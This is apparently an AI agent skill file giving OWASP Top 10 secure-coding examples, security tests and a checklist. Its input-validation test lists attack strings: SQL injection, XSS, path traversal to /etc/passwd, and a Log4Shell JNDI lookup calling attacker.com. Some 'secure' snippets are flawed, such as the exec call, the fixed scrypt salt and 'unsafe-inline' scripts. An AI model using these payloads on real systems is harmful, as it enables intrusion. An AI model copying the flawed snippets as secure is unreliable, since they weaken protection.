---
name: security-expert
description: Expert in application security, OWASP Top 10, security best practices, penetration testing, and secure coding. Use for security audits and hardening.
allowed-tools: Read, Write, Edit, Grep, Glob, Bash
---

# Application Security Expert

## Purpose
Provide expert guidance on application security, vulnerability prevention, security testing, OWASP Top 10 mitigation, and secure coding practices.

## When to Use This Skill
- Security code reviews
- Implementing authentication/authorization
- Preventing common vulnerabilities
- Security testing
- Compliance requirements
- Incident response
- Security architecture

## OWASP Top 10 (2021)

### A01: Broken Access Control
**Prevention:**
```typescript
// BAD - No authorization check
app.delete('/api/users/:id', async (req, res) => {
  await deleteUser(req.params.id);
  res.status(204).send();
});

// GOOD - Proper authorization
app.delete('/api/users/:id', authenticate, async (req, res) => {
  const userId = req.params.id;

  // Check if user can delete this account
  if (req.user.id !== userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  await deleteUser(userId);
  res.status(204).send();
});
```

### A02: Cryptographic Failures
**Prevention:**
```typescript
import bcrypt from 'bcrypt';
import crypto from 'crypto';

// Password hashing
const hashedPassword = await bcrypt.hash(password, 10);

// Encryption
const algorithm = 'aes-256-gcm';
const key = crypto.scryptSync(password, 'salt', 32);
const iv = crypto.randomBytes(16);

const cipher = crypto.createCipheriv(algorithm, key, iv);
let encrypted = cipher.update(text, 'utf8', 'hex');
encrypted += cipher.final('hex');

// Use HTTPS everywhere
app.use((req, res, next) => {
  if (!req.secure && process.env.NODE_ENV === 'production') {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});
```

### A03: Injection
**Prevention:**
```typescript
// SQL Injection - Use parameterized queries
// BAD
const query = `SELECT * FROM users WHERE id = ${userId}`;

// GOOD - Parameterized query
const query = 'SELECT * FROM users WHERE id = $1';
const result = await db.query(query, [userId]);

// NoSQL Injection prevention
// BAD
const user = await User.findOne({ email: req.body.email });

// GOOD - Validate input
import Joi from 'joi';

const schema = Joi.object({
  email: Joi.string().email().required()
});

const { email } = await schema.validateAsync(req.body);
const user = await User.findOne({ email });

// Command Injection prevention
// BAD
const { exec } = require('child_process');
exec(`ping ${req.body.host}`);

// GOOD - Use libraries or whitelist
const { exec } = require('child_process');
const allowedHosts = ['google.com', 'github.com'];

if (!allowedHosts.includes(req.body.host)) {
  throw new Error('Invalid host');
}

exec('ping', [req.body.host]);
```

### A04: Insecure Design
**Prevention:**
```typescript
// Implement rate limiting
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP'
});

app.use('/api/', limiter);

// Strict rate limit for authentication
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true
});

app.post('/api/auth/login', authLimiter, loginHandler);

// Implement CAPTCHA for sensitive operations
app.post('/api/auth/register', async (req, res) => {
  const { token } = req.body;

  // Verify CAPTCHA
  const captchaValid = await verifyCaptcha(token);
  if (!captchaValid) {
    return res.status(400).json({ error: 'CAPTCHA failed' });
  }

  // Proceed with registration
});
```

### A05: Security Misconfiguration
**Prevention:**
```typescript
import helmet from 'helmet';

// Security headers
app.use(helmet());

// Custom security headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

// Disable unnecessary features
app.disable('x-powered-by');

// Environment-specific configs
if (process.env.NODE_ENV === 'production') {
  // Production settings
  app.set('trust proxy', 1);
}
```

### A06: Vulnerable and Outdated Components
**Prevention:**
```bash
# Regular dependency updates
npm audit
npm audit fix

# Use tools like Snyk or Dependabot
# package.json
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "update-deps": "npm update"
  }
}
```

### A07: Identification and Authentication Failures
**Prevention:**
```typescript
import jwt from 'jsonwebtoken';
import speakeasy from 'speakeasy';

// Strong password policy
const passwordSchema = Joi.string()
  .min(12)
  .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
  .required();

// JWT with expiration
const token = jwt.sign(
  { userId: user.id },
  process.env.JWT_SECRET!,
  { expiresIn: '1h' }
);

// Refresh tokens
const refreshToken = jwt.sign(
  { userId: user.id },
  process.env.REFRESH_SECRET!,
  { expiresIn: '7d' }
);

// Store refresh token hash in database
const hashedRefreshToken = await bcrypt.hash(refreshToken, 10);

// Two-Factor Authentication
const secret = speakeasy.generateSecret({ length: 32 });

const verified = speakeasy.totp.verify({
  secret: secret.base32,
  encoding: 'base32',
  token: userToken
});

// Implement account lockout
let failedAttempts = 0;
const MAX_ATTEMPTS = 5;

if (failedAttempts >= MAX_ATTEMPTS) {
  await lockAccount(userId, 15 * 60 * 1000); // 15 minutes
}
```

### A08: Software and Data Integrity Failures
**Prevention:**
```typescript
// Verify package integrity
// package-lock.json ensures integrity

// Code signing for deployments
// Use GPG signatures for commits

// Implement Content Security Policy
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"]
  }
}));
```

### A09: Security Logging and Monitoring Failures
**Prevention:**
```typescript
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  defaultMeta: { service: 'user-service' },
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Log security events
function logSecurityEvent(event: string, details: any) {
  logger.warn('Security Event', {
    event,
    details,
    timestamp: new Date().toISOString(),
    ip: details.ip,
    userId: details.userId
  });
}

// Failed login attempt
logSecurityEvent('FAILED_LOGIN', {
  email: req.body.email,
  ip: req.ip
});

// Unauthorized access attempt
logSecurityEvent('UNAUTHORIZED_ACCESS', {
  userId: req.user.id,
  resource: req.path,
  ip: req.ip
});
```

### A10: Server-Side Request Forgery (SSRF)
**Prevention:**
```typescript
import { URL } from 'url';

// Validate and sanitize URLs
function validateURL(urlString: string): boolean {
  try {
    const url = new URL(urlString);

    // Whitelist allowed protocols
    if (!['http:', 'https:'].includes(url.protocol)) {
      return false;
    }

    // Blacklist private IPs
    const hostname = url.hostname;
    const privateRanges = [
      /^localhost$/,
      /^127\./,
      /^10\./,
      /^172\.(1[6-9]|2\d|3[01])\./,
      /^192\.168\./
    ];

    if (privateRanges.some(range => range.test(hostname))) {
      return false;
    }

    return true;
  } catch {
    return false;
  }
}

// Fetch external resource safely
app.post('/api/fetch', async (req, res) => {
  const { url } = req.body;

  if (!validateURL(url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  const response = await fetch(url, {
    timeout: 5000,
    redirect: 'manual' // Don't follow redirects
  });

  // Don't expose full response
  res.json({
    status: response.status,
    data: await response.text()
  });
});
```

## Security Testing

### 1. Input Validation Testing
```typescript
// Test malicious inputs
const maliciousInputs = [
  "'; DROP TABLE users; --",
  "<script>alert('XSS')</script>",
  "admin' OR '1'='1",
  "../../../etc/passwd",
  "${jndi:ldap://attacker.com/a}"
];

describe('Input Validation', () => {
  maliciousInputs.forEach(input => {
    it(`should reject malicious input: ${input}`, async () => {
      const response = await request(app)
        .post('/api/users')
        .send({ name: input });

      expect(response.status).toBe(400);
    });
  });
});
```

### 2. Authentication Testing
```typescript
describe('Authentication', () => {
  it('should reject expired tokens', async () => {
    const expiredToken = jwt.sign(
      { userId: '123' },
      process.env.JWT_SECRET!,
      { expiresIn: '-1h' }
    );

    const response = await request(app)
      .get('/api/profile')
      .set('Authorization', `Bearer ${expiredToken}`);

    expect(response.status).toBe(401);
  });

  it('should lock account after failed attempts', async () => {
    for (let i = 0; i < 5; i++) {
      await request(app)
        .post('/api/auth/login')
        .send({ email: 'test@example.com', password: 'wrong' });
    }

    const response = await request(app)
      .post('/api/auth/login')
      .send({ email: 'test@example.com', password: 'correct' });

    expect(response.status).toBe(429);
  });
});
```

## Security Checklist

- [ ] Input validation on all user inputs
- [ ] Parameterized queries for databases
- [ ] Password hashing with bcrypt/argon2
- [ ] JWT tokens with expiration
- [ ] HTTPS everywhere
- [ ] Security headers (CSP, HSTS, etc.)
- [ ] Rate limiting on APIs
- [ ] CORS configured properly
- [ ] Secrets in environment variables
- [ ] Error messages don't leak info
- [ ] File uploads validated
- [ ] Dependencies updated regularly
- [ ] Security logging enabled
- [ ] Two-factor authentication
- [ ] Account lockout mechanism

This skill ensures secure, hardened applications resistant to common attacks.
